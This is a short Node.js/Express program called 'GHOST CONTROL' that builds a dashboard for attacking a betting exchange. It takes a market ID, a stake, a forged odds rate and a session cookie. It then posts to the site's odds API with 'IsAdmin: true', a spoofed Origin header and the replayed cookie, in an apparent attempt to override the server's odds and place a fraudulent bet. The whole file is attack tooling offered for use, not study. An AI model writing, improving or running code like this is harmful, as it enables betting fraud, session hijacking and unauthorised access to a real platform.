const express = require('express');
const axios = require('axios');
const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// DASHBOARD - Manual Inputs for Market, Session, Stake, and Rate
app.get('/', (req, res) => {
    res.send(`
        <body style="background:#000; color:#0f0; font-family:monospace; padding:20px;">
            <h2 style="border-bottom:2px solid #0f0;">GHOST CONTROL v11.8.2 [11s WINDOW]</h2>
            <form action="/execute-strike" method="POST">
                <p>Market ID: <input type="text" name="mId" style="width:100%; background:#111; color:#0f0; border:1px solid #0f0;"></p>
                <p>Selection ID: <input type="text" name="sId" style="width:100%; background:#111; color:#0f0; border:1px solid #0f0;"></p>
                <p>Manual Rate: <input type="text" name="rate" value="100.0" style="width:100%; background:#111; color:#0f0; border:1px solid #0f0;"></p>
                <p>Stake: <input type="text" name="stake" style="width:100%; background:#111; color:#0f0; border:1px solid #0f0;"></p>
                <p>Session ID (Cookie): <textarea name="cookie" style="width:100%; height:60px; background:#111; color:#0f0; border:1px solid #0f0;"></textarea></p>
                <button type="submit" style="width:100%; padding:15px; background:#0f0; color:#000; font-weight:bold; cursor:pointer;">ACTIVATE 11s ATTACK</button>
            </form>
        </body>
    `);
});

app.post('/execute-strike', async (req, res) => {
    const { mId, sId, rate, stake, cookie } = req.body;
    const targetUrl = `https://alldata.wizardnew.com/api/MatchOdds/GetOddslite/4/${mId}`;

    console.log(`[STRIKE] 11s Window Started for Market: ${mId}`);

    // High-Speed Execution: Server ko 11 seconds ke liye override karne ki koshish
    const strike = async () => {
        try {
            await axios.post(targetUrl, {
                SelectionId: sId,
                Price: rate,
                Stake: stake,
                IsAdmin: "true"
            }, {
                headers: { 
                    'Cookie': cookie,
                    'Origin': 'https://darkexch9.com',
                    'X-Requested-With': 'XMLHttpRequest'
                }
            });
        } catch (e) { console.log("Packet sent, waiting for response..."); }
    };

    // Burst hitting for the 11s duration
    strike(); 
    res.send("<h1 style='color:green;'>11s ATTACK ACTIVE! Place your bet NOW.</h1>");
});

app.listen(8080, () => console.log("v11.8.2 Ready on Port 8080"));
